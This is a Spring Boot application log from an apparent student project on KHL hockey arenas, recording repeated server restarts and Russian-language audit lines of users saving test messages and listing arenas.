+06-05-2024 12:50:57 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@1c80f8dd, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@51b2b3e6, org.springframework.security.web.context.SecurityContextHolderFilter@36a8ebca, org.springframework.security.web.header.HeaderWriterFilter@44181746, org.springframework.web.filter.CorsFilter@20e7152a, org.springframework.security.web.authentication.logout.LogoutFilter@29a5f924, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@5b4ce00, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@434a72f2, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@5c8e7687, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@202fd4c4, org.springframework.security.web.access.ExceptionTranslationFilter@318a81a0, org.springframework.security.web.access.intercept.AuthorizationFilter@67062a93]
+06-05-2024 12:50:57 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 12:50:57 INFO  Started KhlArenasProjectApp in 3.975 seconds (process running for 4.275)
+06-05-2024 12:50:58 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 12:50:58 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 12:50:58 INFO  Completed initialization in 1 ms
+06-05-2024 12:51:01 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 12:53:18 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:53:18 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 12:53:18 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 12:53:23 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 43776 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 12:53:23 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 12:53:24 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 12:53:24 INFO  Finished Spring Data repository scanning in 57 ms. Found 5 JPA repository interfaces.
+06-05-2024 12:53:25 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 12:53:25 INFO  Starting service [Tomcat]
+06-05-2024 12:53:25 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 12:53:25 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 12:53:25 INFO  Root WebApplicationContext: initialization completed in 1315 ms
+06-05-2024 12:53:25 INFO  HikariPool-1 - Starting...
+06-05-2024 12:53:25 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@2744dcae
+06-05-2024 12:53:25 INFO  HikariPool-1 - Start completed.
+06-05-2024 12:53:25 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 12:53:25 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 12:53:25 INFO  HHH000026: Second-level cache disabled
+06-05-2024 12:53:25 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 12:53:25 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 12:53:26 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 12:53:26 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:53:26 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 12:53:26 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 12:53:27 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@593e594f, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@3a1e5fa7, org.springframework.security.web.context.SecurityContextHolderFilter@26f7b114, org.springframework.security.web.header.HeaderWriterFilter@29a5f924, org.springframework.web.filter.CorsFilter@7866fe3e, org.springframework.security.web.authentication.logout.LogoutFilter@3eadfbbb, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@4bdbfbc6, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@22f0e329, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@3b39bee2, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@498f1f63, org.springframework.security.web.access.ExceptionTranslationFilter@2ddb6c71, org.springframework.security.web.access.intercept.AuthorizationFilter@73072745]
+06-05-2024 12:53:27 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 12:53:27 INFO  Started KhlArenasProjectApp in 4.043 seconds (process running for 4.328)
+06-05-2024 12:53:28 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 12:53:28 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 12:53:28 INFO  Completed initialization in 1 ms
+06-05-2024 12:53:31 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 12:54:25 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:30 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=авыпавы)]
+06-05-2024 12:54:30 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:30 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:33 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=апвпа)]
+06-05-2024 12:54:33 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:33 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:37 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=453643)]
+06-05-2024 12:54:37 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:37 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:42 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=лорлпрллор)]
+06-05-2024 12:54:42 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:42 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:46 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=равпрп  апвррп)]
+06-05-2024 12:54:46 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:46 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:51 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=апрпр прапа апрапр)]
+06-05-2024 12:54:51 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:51 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:55 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=прап546546)]
+06-05-2024 12:54:55 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:55 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:58 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=435354)]
+06-05-2024 12:54:58 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:54:58 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:55:02 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=87678прарп)]
+06-05-2024 12:55:02 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:55:02 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:55:06 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=имсмс6556)]
+06-05-2024 12:55:06 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:55:06 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:55:10 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=прарпарап5646)]
+06-05-2024 12:55:10 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:55:10 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:55:15 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=рпарлррпоп)]
+06-05-2024 12:55:15 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:55:15 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:55:21 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 12:57:41 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:57:41 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 12:57:41 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 12:57:43 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 44080 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 12:57:43 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 12:57:43 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 12:57:43 INFO  Finished Spring Data repository scanning in 59 ms. Found 5 JPA repository interfaces.
+06-05-2024 12:57:44 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 12:57:44 INFO  Starting service [Tomcat]
+06-05-2024 12:57:44 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 12:57:44 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 12:57:44 INFO  Root WebApplicationContext: initialization completed in 1334 ms
+06-05-2024 12:57:44 INFO  HikariPool-1 - Starting...
+06-05-2024 12:57:45 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@7cf63b9a
+06-05-2024 12:57:45 INFO  HikariPool-1 - Start completed.
+06-05-2024 12:57:45 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 12:57:45 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 12:57:45 INFO  HHH000026: Second-level cache disabled
+06-05-2024 12:57:45 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 12:57:45 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 12:57:45 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 12:57:46 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 12:57:46 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 12:57:46 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 12:57:46 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@6bc08a77, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@37922937, org.springframework.security.web.context.SecurityContextHolderFilter@26caf4b6, org.springframework.security.web.header.HeaderWriterFilter@5776a9f8, org.springframework.web.filter.CorsFilter@73483d4b, org.springframework.security.web.authentication.logout.LogoutFilter@3f67f5ff, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@951461a, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@2c750b69, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@159a0f0e, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@8961e55, org.springframework.security.web.access.ExceptionTranslationFilter@5eadc347, org.springframework.security.web.access.intercept.AuthorizationFilter@58701e8c]
+06-05-2024 12:57:46 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 12:57:46 INFO  Started KhlArenasProjectApp in 3.99 seconds (process running for 4.267)
+06-05-2024 12:58:02 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 12:58:03 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 12:58:03 INFO  Completed initialization in 1 ms
+06-05-2024 12:58:07 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:14 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=вавп)]
+06-05-2024 12:58:14 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:14 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:17 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=апввп)]
+06-05-2024 12:58:17 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:17 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:19 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=паввапв)]
+06-05-2024 12:58:19 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:20 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:22 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=папвп)]
+06-05-2024 12:58:22 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:22 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:26 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=павв)]
+06-05-2024 12:58:26 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:26 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:28 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=вапвапав)]
+06-05-2024 12:58:28 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:28 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:31 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=пвапава)]
+06-05-2024 12:58:31 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:31 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:33 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=апвпавпа)]
+06-05-2024 12:58:33 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:34 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:36 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=паавпв)]
+06-05-2024 12:58:36 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:36 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:39 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=павваппа)]
+06-05-2024 12:58:39 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:39 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:41 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=паавппа)]
+06-05-2024 12:58:41 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:41 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:43 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=пававав)]
+06-05-2024 12:58:43 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:43 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:46 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=ппапапа)]
+06-05-2024 12:58:46 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:46 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:50 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=паваавп)]
+06-05-2024 12:58:50 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:50 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:53 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=паваапа)]
+06-05-2024 12:58:53 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:53 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:55 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=аппвапп)]
+06-05-2024 12:58:55 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:55 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:58 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=аппвапп)]
+06-05-2024 12:58:58 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:58:58 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:01 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=павпав)]
+06-05-2024 12:59:01 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:01 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:03 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=апвавпвп)]
+06-05-2024 12:59:03 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:03 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:06 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=апвпавп)]
+06-05-2024 12:59:06 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:06 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:09 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=апвпап)]
+06-05-2024 12:59:09 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:09 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:11 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=паваавпа)]
+06-05-2024 12:59:11 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:11 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:14 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=аввавва)]
+06-05-2024 12:59:14 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:14 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:16 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=вапввпа)]
+06-05-2024 12:59:16 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:16 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:19 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=пвававв)]
+06-05-2024 12:59:19 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:19 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:21 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=павпапв)]
+06-05-2024 12:59:21 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:21 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:23 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=паввв)]
+06-05-2024 12:59:23 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:23 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:25 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=павввап)]
+06-05-2024 12:59:25 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:25 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:27 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=пвпвпапа)]
+06-05-2024 12:59:27 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:27 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:30 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=впвва)]
+06-05-2024 12:59:30 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:30 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:32 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=павапв)]
+06-05-2024 12:59:32 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:32 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:34 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=паввапп)]
+06-05-2024 12:59:34 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:34 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:37 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=авпвппв)]
+06-05-2024 12:59:37 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:37 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:39 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=вппввпвпа)]
+06-05-2024 12:59:39 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:39 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:42 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=вапвппвв)]
+06-05-2024 12:59:42 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:42 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:45 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=ппвпввпа)]
+06-05-2024 12:59:45 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:45 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:47 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=авппвпв)]
+06-05-2024 12:59:47 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:47 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:51 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=павпвап)]
+06-05-2024 12:59:51 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:51 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:55 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=впва)]
+06-05-2024 12:59:55 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 12:59:55 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 13:00:00 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 13:11:36 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 13:11:36 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 13:11:36 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 13:11:39 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 44968 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 13:11:39 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 13:11:39 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 13:11:39 INFO  Finished Spring Data repository scanning in 59 ms. Found 5 JPA repository interfaces.
+06-05-2024 13:11:40 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 13:11:40 INFO  Starting service [Tomcat]
+06-05-2024 13:11:40 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 13:11:40 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 13:11:40 INFO  Root WebApplicationContext: initialization completed in 1268 ms
+06-05-2024 13:11:40 INFO  HikariPool-1 - Starting...
+06-05-2024 13:11:40 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@634ca3e7
+06-05-2024 13:11:40 INFO  HikariPool-1 - Start completed.
+06-05-2024 13:11:40 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 13:11:40 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 13:11:40 INFO  HHH000026: Second-level cache disabled
+06-05-2024 13:11:41 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 13:11:41 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 13:11:41 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 13:11:41 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 13:11:41 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 13:11:42 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 13:11:42 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@593e594f, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@3a1e5fa7, org.springframework.security.web.context.SecurityContextHolderFilter@26f7b114, org.springframework.security.web.header.HeaderWriterFilter@29a5f924, org.springframework.web.filter.CorsFilter@7866fe3e, org.springframework.security.web.authentication.logout.LogoutFilter@3eadfbbb, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@4bdbfbc6, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@22f0e329, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@3b39bee2, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@498f1f63, org.springframework.security.web.access.ExceptionTranslationFilter@2ddb6c71, org.springframework.security.web.access.intercept.AuthorizationFilter@73072745]
+06-05-2024 13:11:42 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 13:11:42 INFO  Started KhlArenasProjectApp in 3.939 seconds (process running for 4.218)
+06-05-2024 13:11:47 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 13:11:47 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 13:11:47 INFO  Completed initialization in 1 ms
+06-05-2024 13:11:49 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 13:15:05 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 13:15:05 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 13:15:05 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 13:15:08 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 45232 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 13:15:08 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 13:15:09 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 13:15:09 INFO  Finished Spring Data repository scanning in 54 ms. Found 5 JPA repository interfaces.
+06-05-2024 13:15:09 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 13:15:09 INFO  Starting service [Tomcat]
+06-05-2024 13:15:09 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
